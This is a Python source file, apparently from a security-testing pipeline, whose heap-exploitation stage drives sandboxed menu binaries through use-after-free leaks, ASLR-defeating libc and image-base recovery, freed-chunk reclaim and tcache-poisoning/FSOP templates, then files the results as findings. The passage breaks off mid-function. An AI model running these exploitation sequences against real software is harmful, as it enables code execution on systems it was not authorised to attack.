"""Custom-allocator heap-primitive discovery stage.

Where `heap_check` (the LD_PRELOAD guard) sees only the libc allocator, this stage finds the
target's OWN allocator (a menu service's `ta_alloc`/`ta_free`), drives heap operation SEQUENCES
against it, and traces the pointer lifecycle by ptrace to discover a DOUBLE-FREE (CWE-415) -- the
primitive that seeds tcache poisoning -> arbitrary write. Native x86-64 / ELF only; deterministic.
"""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

from ...jobs.registry import register_stage
from .. import invocation, substrate
from ..dynamic import sandbox
from ..fuzz import menu
from ..poc import exploit
from . import heaptrace

HEAP_TRACE_STAGE = "heap_trace"
_HELPER = Path(__file__).with_name("heaptrace.py")


def _alloc_ret_offsets(exe: Path, alloc_name: str) -> list[int]:
    """`ret` offsets inside the alloc function, via objdump, so an alloc-return breakpoint reads
    the pointer in rax. Empty (free-only tracking) when objdump is absent -- fine for the short
    create-then-double-free sequences this stage drives."""
    if not shutil.which("objdump"):
        return []
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    m = re.search(rf"^0*([0-9a-fA-F]+) <{re.escape(alloc_name)}>:\n(.*?)\n\n", out, re.S | re.M)
    if not m:
        return []
    base = int(m.group(1), 16)
    rets = [int(ln.split(":")[0].strip(), 16) for ln in m.group(2).splitlines()
            if ln.strip().endswith("ret")]
    return [r - base for r in rets]


def _plt_addr(exe: Path, name: str) -> int | None:
    """Address of the `<name@plt>` stub, resolved from the DYNAMIC symbols -- available even on a
    fully stripped binary (only .symtab is dropped). Used to trace libc malloc/free directly."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(rf"^0*([0-9a-fA-F]+) <{re.escape(name)}@plt>:", out, re.M)
    return int(m.group(1), 16) if m else None


def _read_width(exe: Path) -> int | None:
    """Fixed-width input width W (read(fd,buf,W) with W>=8), or None for a line-based target. A view
    over the shared interaction.read_shape -- the single read-shape analyzer every stage uses, so a
    read(fd,&c,1) char loop is not misread as a width-1 protocol (which padded every field to one
    byte and desynced the crawl)."""
    from .. import interaction
    try:
        return interaction.read_shape(Path(exe).read_bytes()).width
    except Exception:                                    # noqa: BLE001
        return None


def _libc_plt_pair(exe: Path) -> dict | None:
    """A menu-driven heap challenge that uses libc directly: trace the malloc (or calloc) and free
    PLT stubs. Returns the alloc/free stub addresses, or None when the pair is absent. heap_check's
    guard pages cover libc OVERFLOW; this adds the double-free / UAF it cannot see.

    A C++ program's PLT allocator is `operator new`/`operator delete` (_Znwm / _ZdlPv[m]), which
    wrap malloc/free: operator new returns the pointer in rax (like malloc) and operator delete
    takes it in rdi (like free), so the ptrace alloc/free trace works identically -- without this,
    every C++ heap target (and its UAF -> vtable hijack) is invisible to the chain."""
    free, free_name = _plt_addr(exe, "free"), "free"
    if free is None:                                     # C++ operator delete / delete[]
        for dn in ("_ZdlPv", "_ZdlPvm", "_ZdaPv", "_ZdaPvm"):
            free = _plt_addr(exe, dn)
            if free is not None:
                free_name = dn
                break
    if free is None:
        return None
    # malloc family first (a C program), then C++ operator new / new[]
    for an in ("malloc", "calloc", "reallocarray", "realloc", "_Znwm", "_Znam"):
        a = _plt_addr(exe, an)
        if a is not None:
            return {"alloc_name": f"{an}@plt", "alloc": a, "free_name": f"{free_name}@plt",
                    "free": free, "plt": True}
    return None


def _crawl_menu_model(workdir: Path, exe: Path, opts: list[str], *, width=None) -> dict:
    """Learn each menu option's typed field template by driving the sandboxed target interactively.
    `width` (from `_read_width`) selects the fixed-width read(fd, buf, W) input encoding when the
    target is not line-based. Best-effort: any failure yields {} and the caller falls back."""
    def spawn():
        cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
                                     chdir=str(workdir)) + [str(exe)]
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=str(workdir),
                                preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
    try:
        return menu.crawl_menu(spawn, opts, per_option=2.5, width=width)
    except Exception:
        return {}


def crawl_op_model(workdir: Path, exe: Path, opts: list) -> tuple:
    """Shared menu op-model derivation: read the fixed-width input width, then crawl each option's
    typed field template at that width. The heap, out-of-bounds-index, primitive-chaining and fuzz
    stages all drive the SAME two steps, which MUST stay in sync (the width selects the crawl's field
    encoding); folding them here keeps a crawl fix from drifting across four call sites. Each stage
    still derives `opts` itself, since the strings source differs. Returns (width, model); model is
    {} when there is no menu (`opts` empty) or the crawl fails."""
    width = _read_width(exe)
    model = _crawl_menu_model(workdir, exe, opts, width=width) if opts else {}
    return width, model


# Cross-stage menu op-model sharing. Crawling the live menu spawns the target many times; the heap,
# oob-index, primitive-chaining and fuzz stages each run as a SEPARATE worker process, so an
# in-process cache cannot share the crawl between them. Persist it as a per-target artifact instead:
# the first stage to reach it crawls and stores, the rest load it. The payload embeds the target sha
# so two targets never collide on the content-addressed artifact row, and reuse is gated on the
# caller's `opts` matching the stored opts, so a load is only ever a true drop-in for that caller's
# own crawl (behaviour-identical to crawl_op_model, just without the re-drive).
_OP_MODEL_KIND = "interaction-op-model"


def _load_op_model(ctx, target, opts: list):
    """A persisted (width, model) for this target whose crawl used the SAME opts, or None."""
    import json

    from ...db.dao import ArtifactDAO
    try:
        for a in ArtifactDAO(ctx.conn).list_by_case(ctx.case_id):
            if a.kind != _OP_MODEL_KIND or (a.meta or {}).get("target") != target.sha256:
                continue
            doc = json.loads(ctx.content.get_bytes(a.sha256))
            if doc.get("opts") == list(opts):
                return doc.get("width"), doc.get("model") or {}
    except Exception:                                    # noqa: BLE001
        _log.debug("op-model load failed for %s", getattr(target, "id", "?"), exc_info=True)
    return None


def _store_op_model(ctx, target, opts: list, width, model: dict) -> None:
    import json
    try:
        doc = {"target": target.sha256, "opts": list(opts), "width": width, "model": model}
        ctx.put_artifact(_OP_MODEL_KIND, data=json.dumps(doc, sort_keys=True).encode(),
                         meta={"target": target.sha256, "options": len(opts)})
    except Exception:                                    # noqa: BLE001
        _log.debug("op-model store failed for %s", getattr(target, "id", "?"), exc_info=True)


def shared_op_model(ctx, target, workdir: Path, exe: Path, opts: list) -> tuple:
    """crawl_op_model, shared across stages via the artifact store. Reuse a persisted crawl for this
    target+opts when one exists; otherwise crawl and persist it for the later stages. Removes the 3
    redundant live re-crawls a menu heap target otherwise pays (heap_trace, then oob_index,
    chain_primitive and the fuzz campaign each re-driving the same binary)."""
    if opts:
        hit = _load_op_model(ctx, target, opts)
        if hit is not None:
            ctx.progress(msg="op-model: reused shared crawl (no re-drive)")
            return hit
    width, model = crawl_op_model(workdir, exe, opts)
    if opts and model:                                   # only share a crawl that actually learned a flow
        _store_op_model(ctx, target, opts, width, model)
    return width, model


def _spawn_menu(workdir: Path, exe: Path):
    """A fresh sandboxed interactive process for the target (stdin/stdout piped), the same isolation
    the crawl uses."""
    cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
                                 chdir=str(workdir)) + [str(exe)]
    return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, cwd=str(workdir),
                            preexec_fn=sandbox._rlimits(2048, 20, set_as=False))




def _op_writes(opt: str, fields: list, width, *, idx=0, size=0x18, data: bytes = b"",
               fill: bool = True) -> list:
    """The per-FIELD writes for one menu option: [option, field1, field2, ...]. Separate writes (not
    one blob) so an incremental driver can drain between them -- a target whose number reader is a
    fixed read(fd, buf, N)+strtoul number reader consumes N bytes per read and desyncs if several
    fields arrive in one chunk, exactly why a bulk feed failed where the one-field-at-a-time crawl
    worked. A `yn` field (a y/n confirmation in the flow) is answered "y" to proceed. `fill=False`
    sends the `data` buffer SHORT (not padded to the size) so the chunk's tail stays UNINITIALISED --
    an uninit-reuse leak reads that stale tail."""
    out = [menu._scalar(opt.encode(), width)]
    sz = 0
    for f in fields:
        if f == "idx":
            out.append(menu._scalar(str(idx).encode(), width))
        elif f == "num":
            out.append(menu._scalar(str(size).encode(), width))
            sz = size
        elif f == "yn" or f.startswith("yn="):
            ans = f.split("=", 1)[1].encode() if "=" in f else menu._VALUE["yn"]
            out.append(menu._scalar(ans, width))
        elif not width:
            # LINE-BASED target (fgets / read-until-newline char loop): send newline-terminated data,
            # exactly like the crawl did -- read() returns the available bytes (it does NOT block for
            # the full size on a pipe), and a char loop stops at the newline. NUL-padding to the size
            # here would hang a read-until-newline loop. Short by design, so the chunk tail is left
            # UNINITIALISED (what the uninit-reuse leak reads); fill a larger prefix only when asked.
            body = data if data else (b"A" * min(sz, 256) if (fill and sz) else b"A")
            out.append(menu._data(body, None))
        elif not fill:                                   # fixed-width, short -> leave the tail uninit
            out.append(menu._data(data or b"A", width))
        else:                                            # fixed-width: pad each field to the size
            body = data if data else (b"A" * sz if 0 < sz <= 4096 else b"AAAA")
            out.append(body[:sz].ljust(sz, b"\x00") if 0 < sz <= 65536
                       else menu._data(body, width))
    return out


def _drive(workdir: Path, exe: Path, writes: list, *, timeout: float = 10.0, idle: float = 0.2) -> bytes:
    """Drive a staged menu target by sending each write in turn and draining the prompt between
    them (the one-field-at-a-time cadence the crawl uses), returning all captured stdout as raw
    bytes. Keeps a read(fd,buf,N)+strtoul reader in sync where a single bulk write would not."""
    import selectors
    import time as _t
    try:
        p = _spawn_menu(workdir, exe)
    except Exception:
        return b""
    out = b""
    try:
        sel = selectors.DefaultSelector()
        sel.register(p.stdout, selectors.EVENT_READ)
        end = _t.monotonic() + timeout
        # banner + pass any pre-menu prompt (a name/username gate) so writes land on the menu
        menu.drive_to_menu(p, sel, idle=idle, deadline=min(end, _t.monotonic() + 2.0))
        for w in writes:
            if _t.monotonic() >= end:
                break
            try:
                p.stdin.write(w)
                p.stdin.flush()
            except (OSError, ValueError):
                break
            o, alive = menu._drain(p, sel, idle=idle, deadline=min(end, _t.monotonic() + 2.0))
            out += o.encode("latin1") if isinstance(o, str) else (o or b"")
            if not alive:
                break
    finally:
        # CLOSE STDIN before the process object is collected. The writes above are guarded, but
        # the BufferedWriter's finalizer is not: when the target has already exited, flushing it
        # during garbage collection raises BrokenPipeError outside any handler, which pytest
        # surfaces as an unraisable-exception warning and an operator sees as noise in the log.
        # Measured after this stage gained another drive -- more drives, more finalizers.
        try:
            if p.stdin:
                p.stdin.close()
        except Exception:
            pass
        try:
            p.kill()
        except Exception:
            pass
    return out


def identify_heap_ops(workdir: Path, exe: Path, model: dict, opts: list, width) -> dict | None:
    """From a crawled menu model, name the add / free / view options a UAF-leak needs.

    add  -- an allocating option (menu._is_alloc: reads a size, usually a string after it).
    free -- an idx-only option (model[o] == ["idx"]).
    view -- an idx option (NOT free) that ECHOES a stored chunk's bytes back. There is no static
            "view" role, so probe it: add(0, MARKER) then call the candidate on index 0 and keep the
            one whose output contains MARKER. That echo is exactly the oracle a UAF read abuses.

    Returns {"add","free","view"} or None when any role is missing."""
    add = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
    idx_only = [o for o in opts if o in model and model[o] == ["idx"]]
    if not (add and idx_only):
        return None
    # VIEW is the idx-op that ECHOES a stored chunk; FREE is an idx-op that does not. They often have
    # the IDENTICAL template (["idx"]), so the roles can only be told apart by PROBING -- don't assume
    # free is the first one (that mislabels view as free when view happens to come first in the menu).
    # An all-DIGIT marker survives a case transform (a target that toupper/tolower/"funkify"s stored
    # text mangles letters; digits are invariant), and we compare case-insensitively as a backstop.
    marker = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
    cands = [o for o in opts if o in model and model[o][:1] == ["idx"]]
    view = None
    for cand in cands:
        writes = _op_writes(add, model[add], width, idx=0, size=0x80, data=marker) \
            + _op_writes(cand, model[cand], width, idx=0)
        out = _drive(workdir, exe, writes, timeout=8.0)
        if marker in out or marker.lower() in out.lower():
            view = cand
            break
    if view is None:
        return None
    free = next((o for o in idx_only if o != view), None)
    if free is None:
        return None
    # EDIT (optional) -- an option that OVERWRITES a stored chunk (the UAF write that plants a
    # poisoned tcache fd, which the FSOP chain needs). It hides from the crawl: its data read is
    # guarded by a LIVE allocation at the index, which an isolated crawl never primes, so it looks
    # idx-only (like free). Distinguish it from free by PRIMING a chunk, driving the candidate, and
    # keeping the one whose write shows up in a subsequent view.
    #
    # Two field shapes occur and they cannot be told apart statically, so TRY BOTH: idx-then-data,
    # and idx-then-LENGTH-then-data (an edit that re-asks how many bytes to write). Feeding the
    # first shape to a length-asking edit desyncs it -- the marker is consumed as the length -- so
    # the shape that actually lands is recorded and the templates are built from it.
    # Only the DATA prompt hides behind the live-chunk guard -- every prompt before it is printed
    # unconditionally, so a length-asking edit already shows up as ["idx","num"] in the crawl and an
    # idx-only one as ["idx"]. Consider any idx-led option that is not add/view/free, and try the
    # shape the model suggests first.
    PRIME = 0x80
    edit, edit_fields = None, None
    for cand in [o for o in opts if o in model and model[o][:1] == ["idx"]
                 and o not in (add, view, free)]:
        shapes = ([["idx", "num", "str"], ["idx", "str"]] if "num" in model[cand]
                  else [["idx", "str"], ["idx", "num", "str"]])
        for fields in shapes:
            m2 = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
            ew = [menu._scalar(cand.encode(), width), menu._scalar(b"0", width)]
            if "num" in fields:
                ew.append(menu._scalar(str(len(m2)).encode(), width))
                # EXACTLY the length we declared, with no newline: this edit reads that many bytes,
                # so a line terminator would be left in the pipe and read as the next menu option
                # (which exits the target before the view that would prove the write landed).
                ew.append(bytes(m2))
            else:
                # fixed-width: the data read may consume exactly the chunk size, so pad the marker to
                # it or an exact-read loop waits forever and the edit never lands
                ew.append(menu._data(m2.ljust(PRIME, b"\x00") if width else m2, width))
            writes = (_op_writes(add, model[add], width, idx=0, size=PRIME, data=b"X" * 8)
                      + ew + _op_writes(view, model[view], width, idx=0))
            out = _drive(workdir, exe, writes, timeout=8.0)
            if m2 in out or m2.lower() in out.lower():
                edit, edit_fields = cand, fields
                break
        if edit:
            break
    return {"add": add, "free": free, "view": view, "edit": edit, "edit_fields": edit_fields}


def _fsop_template(opt: str, fields: list) -> str | None:
    """One menu op as a `_heap_menu_render` template (option then each field, in the crawled ORDER,
    with {idx}/{size}/{data} placeholders). The chunk-content string becomes {data} (the LAST str, so
    a leading name/label string gets a literal value instead); a trailing {data} carries no newline
    (the FSOP blob is binary and last), every other field is newline-terminated."""
    last_str = max((j for j, f in enumerate(fields) if f == "str"), default=-1)
    parts = [opt]
    for j, f in enumerate(fields):
        if f == "idx":
            parts.append("{idx}")
        elif f == "num":
            parts.append("{size}")
        elif f == "yn" or f.startswith("yn="):
            parts.append(f.split("=", 1)[1] if "=" in f else "y")
        elif f == "str":
            parts.append("{data}" if j == last_str else "A")
        else:
            return None
    tmpl = "\n".join(parts)
    return tmpl if last_str == len(fields) - 1 else tmpl + "\n"


def fsop_templates(opts: list, model: dict, ops: dict, width) -> dict | None:
    """Build the FSOP driver's op templates from a crawled op-model, so a NON-canonical menu (not
    1=add/2=free/3=view/4=edit/5=exit) still drives the tcache-poison + House-of-Apple-2 chain. Needs
    add/free/view AND edit (the UAF write that plants the poisoned fd). The templates are
    protocol-neutral -- newline-separated fields -- and the renderer (exploit_stage._heap_menu_render)
    encodes them as lines or, for a fixed-width read(fd, buf, W) target (`width`), as W-padded scalars
    plus a size-padded data buffer. Returns {add,free,view,edit,exit_seq} or None when a role or field
    shape is missing."""
    if not all(ops.get(k) for k in ("add", "free", "view", "edit")):
        return None
    out: dict = {}
    for role in ("add", "free", "view"):
        t = _fsop_template(ops[role], model.get(ops[role], []))
        if t is None:
            return None
        out[role] = t
    # edit's fields are hidden from the crawl (they need a live chunk), so model[edit] is idx-only;
    # build its template from the SHAPE identify_heap_ops probed into it, which is idx-then-data or
    # idx-then-LENGTH-then-data. A {size} here tells the renderer the edit declares its own length,
    # so the write is sized to the payload rather than padded to the chunk.
    out["edit"] = _fsop_template(ops["edit"], ops.get("edit_fields") or ["idx", "str"])
    if out["edit"] is None:
        return None
    used = {ops[k] for k in ("add", "free", "view", "edit")}
    # Exit = an option that LEAVES the menu: it took no fields and did not loop back, so the crawl
    # recorded nothing for it (absent from the model) -- prefer that, else any unused option.
    exit_opt = next((o for o in opts if o not in used and o not in model), None) \
        or next((o for o in opts if o not in used), None)
    out["exit_seq"] = f"{exit_opt}\n" if exit_opt else "5\n"
    return out


def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, target_bytes: bytes,
                  libc_data: bytes = b"", unsorted_off: int = 0, timeout: float = 10.0) -> dict | None:
    """Drive Create -> Remove -> Show on the SAME index in one process and recover the base the freed
    chunk discloses. A chunk sized into the UNSORTED bin (>= 0x430) frees with its fd/bk pointing at
    `main_arena + 0x60` (a libc pointer): libc_base = leaked - unsorted_off, confirmed only when that
    subtraction is page-aligned (the honesty guard -- a random pointer will not land on a page). A
    small chunk frees into tcache and leaks a (safe-linked) heap pointer. Also classifies a leaked
    libc/PIE CODE pointer via the shared classifier. Returns {kind, base, leaked, dump, size} or None.
    Reuses leak._le_pointer_words + leak.classify_leak verbatim -- the Show output is a byte blob."""
    import re as _re

    from ..poc import leak as _leak
    add, free, view = ops["add"], ops["free"], ops["view"]

    def _c(opt, **kw):
        return _op_writes(opt, model[opt], width, **kw)

    #: Image bases recovered from any of the strategies below, in the order they were seen.
    pie_seen: list = []

    def _harvest_pie():
        """One extra drive to recover the IMAGE base when no earlier strategy happened to show
        it. The libc strategies win first and their dumps are full of libc pointers, so a target
        that discloses its own code pointers was still reported with `pie_base: None`
        **[measured: the exec experiment fell back to the tracer's load base while this function
        could have had the real one for one more drive]**. The small-chunk view is the dump that
        shows the OBJECT's bytes, where a surviving code pointer lives.
        """
        if pie_seen:
            return
        out2 = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8)
                      + _c(add, idx=1, size=0x18) + _c(free, idx=0) + _c(view, idx=0),
                      timeout=timeout)
        if not out2:
            return
        vals2 = _leak._le_pointer_words(out2)
        try:
            base2 = _leak.classify_leak(vals2, target_bytes, libc_data).get("pie_base")
        except Exception:                                # noqa: BLE001 -- advisory
            base2 = None
        if base2:
            pie_seen.append(int(base2))

    def _libc_from(out: bytes):
        """A libc base from the Show output, or None. Harvests full 8-byte pointer words AND the
        6-byte little-endian run a printf(\"%s\") viewer leaves when it truncates at the pointer's
        NUL high bytes; accepts `leaked - unsorted_off` only when PAGE-ALIGNED (the guard that both
        avoids fabricating a base and separates a real libc pointer from a 0x7f-prefixed stack one)."""
        vals = [int(m.group(0), 16) for m in _re.finditer(rb"0x[0-9a-fA-F]{6,}", out)]
        vals += _leak._le_pointer_words(out)
        vals += [int.from_bytes(out[i:i + 6], "little") for i in range(len(out) - 5)
                 if out[i + 5] == 0x7F]
        # A viewer that CASE-FOLDS its output (toupper/tolower/"funkify") mangles a leaked pointer's
        # letter bytes and can lowercase the image top byte 0x55/0x56 to 0x75/0x76; recover the
        # un-folded candidates too. The page-alignment guard below and classify_leak's corroboration
        # drop the bogus case-variants, so adding them only RESCUES a transformed leak, never fabricates.
        vals += _leak._case_fold_pointer_candidates(out)
        if unsorted_off:
            for v in vals:
                if 0x7f0000000000 <= v < 0x800000000000:
                    base = v - int(unsorted_off)
                    if base > 0 and base % 0x1000 == 0:
                        return base, v
        cls = _leak.classify_leak(vals, target_bytes, libc_data)   # a leaked libc CODE pointer
        # KEEP THE IMAGE BASE. `classify_leak` recovers it from the binary's own symbols and this
        # function discarded it, which is why a demonstrated redirect had to take its code
        # address from the tracer's fixed load base and carry an ASLR caveat -- the number it
        # needed was computed here and dropped. Recorded beside the libc answer, since a leak
        # that yields both should not have to choose.
        if cls.get("pie_base"):
            pie_seen.append(int(cls["pie_base"]))
        return (cls["libc_base"], None) if cls.get("libc_base") else (None, None)

    # Strategy 1 -- single large chunk: a >=0x430 request frees straight to the unsorted bin (fd =
    # main_arena); a guard chunk keeps it off the top. Works on a notebook with no size cap.
    big = (_c(add, idx=0, size=0x500, data=b"P" * 8) + _c(add, idx=1, size=0x500, data=b"G" * 8)
           + _c(free, idx=0) + _c(view, idx=0))
    # Strategy 2 -- TCACHE-FILL: a notebook that CAPS the request size (rejecting a large chunk) can only
    # allocate tcache-sized chunks, so fill the 0x90 tcache bin with 7 frees and the 8th spills to
    # the unsorted bin (fd = main_arena). Allocate 9 (page 8 guards the top), free 0..7, Show 7.
    fill = []
    for p in range(9):
        fill += _c(add, idx=p, size=0x80, data=b"P" * 8)     # 0x80 user -> 0x90 chunk (above fastbin)
    for p in range(8):
        fill += _c(free, idx=p)
    fill += _c(view, idx=7)
    # Strategy UNINIT-REUSE: a chunk whose data read does NOT fill the allocation leaves the tail
    # uninitialised; after freeing a chunk (fd/bk = main_arena for unsorted, or a safe-linked heap
    # fd for tcache) and re-allocating the SAME size with a SHORT write (fill=False), that stale
    # pointer survives in the tail and a Show of the reused chunk discloses it. Distinct from the UAF
    # read (which views a FREED index): here the chunk is live and re-read, so a notebook that NULLs
    # the pointer on free (no UAF) still leaks. Large size -> a libc pointer; the guards below sort it.
    reuse = (_c(add, idx=0, size=0x500, data=b"A") + _c(add, idx=1, size=0x500, data=b"A")  # guard top
             + _c(free, idx=0) + _c(add, idx=2, size=0x500, data=b"A", fill=False)
             + _c(view, idx=2))
    heap_fallback = None                                 # a leaked heap fd if no libc is reachable
    for writes, show_sz in ((big, 0x500), (fill, 0x80), (reuse, 0x500)):
        out = _drive(workdir, exe, writes, timeout=timeout)
        if not out:
            continue
        base, leaked = _libc_from(out)
        if base:
            _harvest_pie()
            return {"kind": "libc", "base": base, "leaked": leaked, "dump": out[:400],
                    "size": show_sz, "pie_base": (pie_seen[0] if pie_seen else None)}
        # No libc pointer, but a freed chunk whose fd is a heap address (0x55/0x56 top byte -- a raw
        # or safe-linked tcache fd) is still a DEMONSTRATED heap-ASLR defeat. On a modern glibc the
        # Nth same-size free often stays in tcache (safe-linked fd) instead of spilling to the
        # unsorted bin, so this is the common disclosure when a libc pointer is out of reach.
        if heap_fallback is None:
            hv = next((v for v in _leak._le_pointer_words(out) if (v >> 40) in (0x55, 0x56)), None)
            if hv:
                heap_fallback = {"kind": "heap", "base": hv, "leaked": hv,
                                 "dump": out[:400], "size": show_sz,
                                 "pie_base": (pie_seen[0] if pie_seen else None)}
    # Strategy 3 -- small single chunk: no libc reachable, but a tcache fd is still a heap-address
    # disclosure (defeats heap ASLR). Separate, so a stray 0x7f value never masquerades as libc.
    out = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8) + _c(add, idx=1, size=0x18)
                 + _c(free, idx=0) + _c(view, idx=0), timeout=timeout)
    if out:
        vals = _leak._le_pointer_words(out)
        heapish = next((v for v in vals if (v >> 40) in (0x55, 0x56)), None)
        if heapish:
            _harvest_pie()
            return {"kind": "heap", "base": heapish, "leaked": heapish, "dump": out[:400],
                    "size": 0x18, "pie_base": (pie_seen[0] if pie_seen else None)}
    _harvest_pie()
    if heap_fallback is not None and pie_seen and not heap_fallback.get("pie_base"):
        heap_fallback["pie_base"] = pie_seen[0]
    if heap_fallback is None and pie_seen:
        # No libc and no heap pointer, but the IMAGE base is recovered -- which is the one a
        # redirect into the binary's own code actually needs.
        return {"kind": "pie", "base": pie_seen[0], "leaked": pie_seen[0], "dump": b"",
                "size": 0, "pie_base": pie_seen[0]}
    return heap_fallback


#: Size classes the reclaim experiment tries, in order. 0x80 is a tcache bin (LIFO: the next
#: same-size request returns the chunk just freed, which is the whole mechanism), 0x18 is the
#: smallest bin a notebook typically allows. Two, because each is four process drives.
_RECLAIM_SIZES = (0x80, 0x18)
#: The size class the CONTROL allocation uses -- far enough from either of the above that no
#: allocator returns the same chunk for it, so a marker that still comes back is an echo.
_RECLAIM_CONTROL_SIZE = 0x500


def heap_uaf_reclaim(workdir: Path, exe: Path, ops: dict, model: dict, width, *,
                     timeout: float = 20.0) -> dict | None:
    """Demonstrate that an attacker's own allocation TAKES the freed chunk, and that the program
    then reads the attacker's bytes through the stale pointer.

    The lifetime verdict in `poc_primitive` deliberately stops short of this: it reads a sanitizer
    report, and ASan quarantines a freed chunk -- that is how the use is caught -- so under that
    build nothing can ever reclaim it. Without a sanitizer the allocator behaves normally and the
    target's own `view` option is the oracle:

        add(victim, S)  add(guard, S)  free(victim)  add(attacker, S, MARKER)  view(victim)

    If the view of the FREED entry prints the marker the LATER allocation carried, the attacker's
    bytes occupy the chunk the stale pointer addresses. The control run allocates in a different
    size class, where no reclaim is possible; it exists because a target that echoes recent input
    out of a shared buffer would print the marker whatever the allocator did. See
    `primitive.reclaim_verdict` for how the two runs combine into a verdict.

    Returns the verdict dict (with `stale`/`control` output samples) or None.
    """
    from ..poc import primitive as _prim
    add, free, view = ops["add"], ops["free"], ops["view"]

    def _c(opt, **kw):
        return _op_writes(opt, model[opt], width, **kw)

    def _seq(victim_size, attacker_size):
        # The guard keeps the victim off the top of the heap, so freeing it goes to a bin instead
        # of being absorbed back into the wilderness -- without it there is nothing to reclaim.
        # Both sizes are parameters rather than one of them closing over the loop variable: the
        # whole experiment is the difference between them.
        return (_c(add, idx=0, size=victim_size, data=b"P" * 8)
                + _c(add, idx=1, size=victim_size, data=b"G" * 8)
                + _c(free, idx=0)
                + _c(add, idx=2, size=attacker_size, data=_prim.RECLAIM_MARKER)
                + _c(view, idx=0))

    for size in _RECLAIM_SIZES:
        stale = _drive(workdir, exe, _seq(size, size), timeout=timeout)
        if _prim.RECLAIM_MARKER not in (stale or b""):
            continue
        control = _drive(workdir, exe, _seq(size, _RECLAIM_CONTROL_SIZE), timeout=timeout)
        verdict = _prim.reclaim_verdict(stale, control, size=size)
        if verdict:
            verdict["stale"] = (stale or b"")[-400:]
            verdict["control"] = (control or b"")[-400:]
            verdict["ops"] = {"add": add, "free": free, "view": view}
            return verdict
    return None


def _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc, traced=None):
    """Run the reclaim experiment and file what it demonstrated. Returns a metrics dict or None.

    Filed as its own finding (like the UAF-read leak beside it) rather than as another sentence on
    the crash finding: "the attacker chooses the contents of an object the program still believes
    it owns" is a different claim from "the program touched a dead chunk", and it is the one an
    operator would act on first.
    """
    import json as _json

    from ...db.dao import FindingDAO
    from ..poc import primitive as _prim
    if not (opts and model):
        return None
    ops = identify_heap_ops(workdir, exe, model, opts, width)
    if not ops:
        return None
    hit = heap_uaf_reclaim(workdir, exe, ops, model, width)
    if not hit:
        return None
    effect = _prim.reclaim_effect(hit)
    detail = (f"Reclaim experiment on {alloc['alloc_name']}/{alloc['free_name']}: "
              f"add -> free -> add({hit['size']:#x}, marker) -> view of the FREED index "
              f"(options add={ops['add']!r} free={ops['free']!r} view={ops['view']!r}). {effect}")
    ctx.emit("heaptrace.reclaim", payload={
        "type": hit["type"], "confirmed": hit["confirmed"], "size": hit["size"],
        "control_echoed": hit["control_echoed"], "ops": hit["ops"],
        "allocator": alloc["alloc_name"]})
    if not hit["confirmed"]:
        # The oracle was unsound here. Say so and file NOTHING: an inconclusive experiment is not
        # evidence, and a finding that has to be read carefully to discover it proves nothing is
        # worse than no finding.
        ctx.progress(msg="reclaim experiment inconclusive (the target echoes recent input)")
        return {"metrics": {"reclaim": "inconclusive"}}
    eff = [{"kind": "memory-corruption",
            "title": "Attacker-controlled contents in a freed object (demonstrated)",
            "status": "demonstrated", "detail": detail,
            "proof": {"type": "uaf-reclaim", "size": hit["size"], "marker": hit["marker"],
                      "view_op": ops["view"], "free_op": ops["free"], "add_op": ops["add"]}}]
    # The tracer's chain rides along when it got further than the output oracle can: this route
    # proves the attacker chooses the contents, and only the tracer can show the program CALLING
    # through them and arriving at code we picked. One finding, both bodies of evidence.
    _ex = (traced or {}).get("exec")
    if _ex:
        _xd = (f"Driven to code execution: with the address of `{_ex.get('function')}` "
               f"({_ex.get('addr')}, from {_ex.get('addr_source')}) in the reclaim payload, the "
               f"program called through the dead object and arrived at that function -- observed "
               f"at a breakpoint on it."
               + (f" The leaked image base matches the one the tracer measured "
                  f"({_ex.get('leaked_base')}), so the address does not depend on ASLR being off."
                  if _ex.get("bases_agree") and _ex.get("addr_source") == "leaked at runtime"
                  else " The address is absolute and this tracer disables ASLR, so against a "
                       "live target the same step needs a leak -- no disclosure here recovered "
                       "the image base."))
        detail = detail + " " + _xd
        eff = [{"kind": "rce",
                "title": (f"Code execution through a reclaimed freed object: "
                          f"{_ex.get('function')} (demonstrated)"),
                "status": "demonstrated", "detail": _xd, "proof": dict(_ex)},
               {"kind": "control-flow-hijack",
                "title": "Control-flow hijack through a reclaimed freed object (demonstrated)",
                "status": "demonstrated", "detail": _xd, "proof": dict(_ex)}] + eff
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": "CWE-416",
        "title": (f"Use-after-free: reclaimed object redirects execution into "
                  f"{_ex.get('function')}" if _ex else
                  "Use-after-free with a demonstrated reclaim"),
        "severity": "critical", "detector": "heap_trace", "state": "corroborated",
        "confidence": 0.95,
        "dedup_key": f"CWE-416:uaf-reclaim:{alloc['free_name']}",
        "function_addr": alloc["free"], "site_addr": None, "site_detail": alloc["free_name"],
        "evidence": [{"channel": "effects", "detail": _json.dumps(eff)},
                     {"channel": "heap-trace", "detail": detail}]})
    ctx.progress(msg=f"reclaim demonstrated at size {hit['size']:#x} "
                     + (f"-> code execution in {_ex.get('function')}" if _ex
                        else "(a later allocation took the freed chunk)"))
    return {"metrics": {"reclaim": "demonstrated", "reclaim_size": hit["size"],
                        "reclaim_exec": (_ex or {}).get("function")}}


def _pie_for(target, exe) -> bool:
